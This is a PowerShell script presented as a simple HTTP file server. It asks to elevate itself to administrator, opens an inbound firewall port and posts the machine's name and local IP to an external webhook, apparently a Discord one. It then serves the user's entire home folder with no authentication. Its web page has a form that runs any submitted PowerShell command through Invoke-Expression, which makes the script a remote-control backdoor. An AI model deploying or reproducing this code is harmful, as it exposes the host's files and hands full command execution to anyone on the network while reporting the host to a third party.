<#
============================== Beigeworm's Simple HTTP File Server ===============================

SYNOPSIS
This script serves the contents the USER directory to the ip of the system.
(NOTE TO SELF - i still need to add discord notification of local ip address)

INSTRUCTIONS
Run script and input given URL in a browser.

#>

Write-Host "Starting Simple HTTP Server..." -ForegroundColor Green
Write-Host "#====================== Simple HTTP File Server ======================="

Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

$Button = [System.Windows.MessageBoxButton]::OKCancel
$ErrorIco = [System.Windows.MessageBoxImage]::Information
$Ask = '        This Script Needs Administrator Privileges.

        Select "OK" to Run as an Administrator
        
        Select "Cancel" to Stop the Script
        
        (Needed for Opening Ports and Serving Files)'

If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Write-Host "Admin privileges needed for this script..." -ForegroundColor Red
    Write-Host "Sending User Prompt."
    $Prompt = [System.Windows.MessageBox]::Show($Ask, "Run as an Admin?", $Button, $ErrorIco) 
    Switch ($Prompt) {
        OK {
            Write-Host "This script will self elevate to run as an Administrator and continue."
            sleep 1
            Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
            Exit
        }
        Cancel {
            Write-Host "Cancelling...." -ForegroundColor Red
            Exit
        }
    }
}

$fpath = $env:USERPROFILE
$fpath | Out-File -FilePath "$env:temp/homepath.txt"

$whuri = "$dc"

$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }
$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -contains 'Wi-Fi' -or  $_.Name -contains 'Ethernet'}
$primaryInterface = $filteredInterfaces | Select-Object -First 1
if ($primaryInterface) {
    if ($primaryInterface.Name -contains 'Wi-Fi') {
        Write-Output "Wi-Fi is the primary internet connection."
        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
    } elseif ($primaryInterface.Name -contains 'Ethernet') {
        Write-Output "Ethernet is the primary internet connection."
        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress
    } else {
        Write-Output "Unknown primary internet connection."
    }
} else {
    Write-Output "No primary internet connection found."
}


New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action Allow
$loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
$hpath = Get-Content -Path "$env:temp/homepath.txt"

$escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" 
            "content" = $escmsgsys} | ConvertTo-Json
Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys


cd "$hpath"
Write-Host "Server Starting at : http://localhost:5000/"
Write-Host ("Other Network Devices Can Reach it at : http://"+$loip+":5000")
$httpsrvlsnr = New-Object System.Net.HttpListener;

$httpsrvlsnr.Prefixes.Add("http://"+$loip+":5000/");
$httpsrvlsnr.Prefixes.Add("http://localhost:5000/");

$httpsrvlsnr.Start();
$webroot = New-PSDrive -Name webroot -PSProvider FileSystem -Root $PWD.Path
[byte[]]$buffer = $null
Write-Host "==== SESSION STARTED! ====" -ForegroundColor Green


while ($httpsrvlsnr.IsListening) {
    try {
        $ctx = $httpsrvlsnr.GetContext();
        
        if ($ctx.Request.RawUrl -eq "/") {

            $html = "<html><head><style>"

            $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #6a3278; }"
            $html += "h1 { color: #FFF; }"
            $html += "a { color: #007BFF; text-decoration: none; }"
            $html += "a:hover { text-decoration: underline; }"
            $html += "ul { list-style-type: none; padding-left: 0; }"
            $html += "li { margin-bottom: 5px; }"
            $html += "textarea { width: 100%; padding: 10px; font-size: 14px; }"
            $html += "input[type='submit'] { margin-top: 10px; padding: 5px 10px; background-color: #40ad24; color: #FFF; border: none; border-radius: 4px; cursor: pointer; }"
            $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
            $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"

          $html += "</style></head><body>"

            $html += "<h1>File Listing</h1><ul>"
            $files = Get-ChildItem -Path $PWD.Path -Force
            foreach ($file in $files) {
                $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
                if ($file.PSIsContainer) {
                    $html += "<li><a href='/browse$fileUrl'><button>Open Folder</button></a><a> $file</a></li>"
                } else {
                    $html += "<li><a href='/download$fileUrl'><button>Download</button></a><a> $file</a></li>"
                }
            }
            $html += "</ul><hr>"
            $html += "<h1>Stop the Server </h1><a href='/stop'><button>STOP SERVER</button></a><hr>"
            $html += "<h1>PowerShell Command Input</h1>"
            $html += "<form method='post' action='/execute'>"
            $html += "<input type='submit' value='Execute'>"
            $html += "<textarea name='command' rows='10' cols='80'></textarea><br>"
            $html += "</form>"
            $html += "</body></html>"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
            $ctx.Response.ContentLength64 = $buffer.Length;
            $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
        }
        elseif ($ctx.Request.RawUrl -eq "/stop") {
            $httpsrvlsnr.Stop();
            Remove-PSDrive -Name webroot -PSProvider FileSystem;
        }
        elseif ($ctx.Request.RawUrl -match "^/download/.+") {
            $filePath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/download", "")
            if ([System.IO.File]::Exists($filePath)) {
                $ctx.Response.ContentType = 'application/octet-stream'
                $ctx.Response.ContentLength64 = (Get-Item -Path $filePath).Length
                $fileStream = [System.IO.File]::OpenRead($filePath)
                $fileStream.CopyTo($ctx.Response.OutputStream)
                $ctx.Response.OutputStream.Flush()
                $ctx.Response.Close()
                $fileStream.Close()
            }
        }
        elseif ($ctx.Request.RawUrl -match "^/browse/.+") {
            $folderPath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/browse", "")
            if ([System.IO.Directory]::Exists($folderPath)) {
                
            $html = "<html><head><style>"

            $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #6a3278; }"
            $html += "h1 { color: #FFF; }"
            $html += "a { color: #007BFF; text-decoration: none; }"
            $html += "a:hover { text-decoration: underline; }"
            $html += "ul { list-style-type: none; padding-left: 0; }"
            $html += "li { margin-bottom: 5px; }"
            $html += "textarea { width: 100%; padding: 10px; font-size: 14px; }"
            $html += "input[type='submit'] { margin-top: 10px; padding: 5px 10px; background-color: #40ad24; color: #FFF; border: none; border-radius: 4px; cursor: pointer; }"
            $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
            $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"

            $html += "</style></head><body>"

                $html += "<h3>Contents of $folderPath</h3><ul>"
                $files = Get-ChildItem -Path $folderPath -Force
                foreach ($file in $files) {
                    $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
                    if ($file.PSIsContainer) {
                        $html += "<li><a href='/browse$fileUrl'><button>Open Folder</button></a><a> $file</a></li>"
                    } else {
                        $html += "<li><a href='/download$fileUrl'><button>Download</button></a><a> $file</a></li>"
                    }
                }
                $html += "</ul></body></html>"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
                $ctx.Response.ContentLength64 = $buffer.Length;
                $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
            }
        }
        elseif ($ctx.Request.RawUrl -eq "/execute" -and $ctx.Request.HttpMethod -eq "POST") {
            $reader = New-Object IO.StreamReader $ctx.Request.InputStream,[System.Text.Encoding]::UTF8
            $postParams = $reader.ReadToEnd()
            $reader.Close()

            $command = $postParams.Split('=')[1] -replace "%20", " "
            $output = Invoke-Expression $command | Out-String

            $html = "<html><head><style>"

            $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #6a3278; }"
            $html += "h1 { color: #FFF; }"
            $html += "a { color: #007BFF; text-decoration: none; }"
            $html += "a:hover { text-decoration: underline; }"
            $html += "ul { list-style-type: none; padding-left: 0; }"
            $html += "li { margin-bottom: 5px; }"
            $html += "textarea { width: 100%; padding: 10px; font-size: 14px; }"
            $html += "input[type='submit'] { margin-top: 10px; padding: 5px 10px; background-color: #40ad24; color: #FFF; border: none; border-radius: 4px; cursor: pointer; }"
            $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
            $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"

            $html += "</style></head><body>"

            $html = "<h1>Command Output</h1><pre>$output</pre></body></html>"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
            $ctx.Response.ContentLength64 = $buffer.Length;
            $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
        }

    }
    catch [System.Net.HttpListenerException] {
        Write-Host ($_);
    }
}



Write-Host "Server Stopped!" -ForegroundColor Green
